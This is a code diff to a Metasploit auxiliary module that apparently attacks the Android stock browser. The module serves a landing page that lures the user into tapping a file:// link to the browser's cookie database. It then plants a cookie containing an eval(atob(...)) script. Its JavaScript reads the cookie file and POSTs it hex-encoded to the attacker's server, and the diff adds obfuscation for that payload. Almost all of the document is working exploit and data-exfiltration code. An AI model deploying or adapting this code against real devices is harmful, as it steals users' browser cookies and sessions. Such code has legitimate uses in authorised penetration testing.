@@ -4,11 +4,13 @@
 ##
 
 require 'msf/core'
+require 'msf/core/exploit/jsobfu'
 
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
+  include Msf::Exploit::JSObfu
 
   def initialize(info={})
     super(update_info(info,
@@ -38,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
      register_options([
       OptString.new('COOKIE_FILE', [
         true,
-        'The cookie file to steal. This is "webview.db" on some devices.',
+        'The cookie file on the device.',
         'webviewCookiesChromium.db'
       ])
     ], self.class)
@@ -49,6 +51,9 @@ class Metasploit3 < Msf::Auxiliary
       print_status("Processing exfilrated files...")
       process_post(cli, request)
       send_response_html(cli, '')
+    elsif request.uri =~ /\.js$/i
+      print_status("Sending exploit javascript")
+      send_response(cli, exfiltration_js, 'Content-type' => 'text/javascript')
     else
       print_status("Sending exploit landing page...")
       send_response_html(cli, landing_page_html)
@@ -79,11 +84,11 @@ class Metasploit3 < Msf::Auxiliary
       <html>
         <head><meta name="viewport" content="width=device-width, user-scalable=no" /></head>
         <body style='width:100%;font-size: 16px;'>
-          <a href='file://#{cookie_path}'>
+          <a href='file://#{cookie_path(datastore['COOKIE_FILE'])}##{Rex::Text.encode_base64(exfiltration_js)}'>
             Redirecting... To continue, tap and hold here, then choose "Open in a new tab"
           </a>
           <script>
-            document.cookie='#{per_run_token}=<script>eval(atob("#{Rex::Text::encode_base64(exfiltration_js)}"))<\\/script>';
+            #{inline_script}
           </script>
         </body>
       </html>
@@ -91,9 +96,9 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def exfiltration_js
-    %Q|
+    js_obfuscate %Q|
         var x = new XMLHttpRequest();
-        x.open('GET', './#{datastore['COOKIE_FILE']}');
+        x.open('GET', '');
         x.responseType = 'arraybuffer';
         x.onreadystatechange = function(){
           if (x.readyState == 4) {
@@ -103,24 +108,31 @@ class Metasploit3 < Msf::Auxiliary
               return (c.length < 2) ? '0'+c : c;
             }).join('');
             var x2 = new XMLHttpRequest();
-            x2.open('POST', '#{backend_url}');
+            x2.open('POST', '#{backend_url}/');
             x2.setRequestHeader('Content-type', 'text/plain');
             x2.send(hex);
           }
         };
         x.send();
+
       |
   end
 
-  def cookie_path
-    '/data/data/com.android.browser/databases/' + datastore['COOKIE_FILE']
+  def inline_script
+    %Q|
+      document.cookie='#{per_run_token}=<script>eval(atob(location.hash.slice(1)))<\\/script>';
+    |
+  end
+
+  def cookie_path(file='')
+    '/data/data/com.android.browser/databases/' + file
   end
 
   def backend_url
     proto = (datastore["SSL"] ? "https" : "http")
     myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
     port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
-    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}"
+    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH'].gsub(/^\//, '')}"
   end
 
   def hex2bin(hex)
@@ -128,7 +140,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def per_run_token
-    @token ||= Rex::Text.rand_text_alpha(rand(5)+3)
+    @token ||= Rex::Text.rand_text_alpha(rand(2)+1)
   end
 
 end
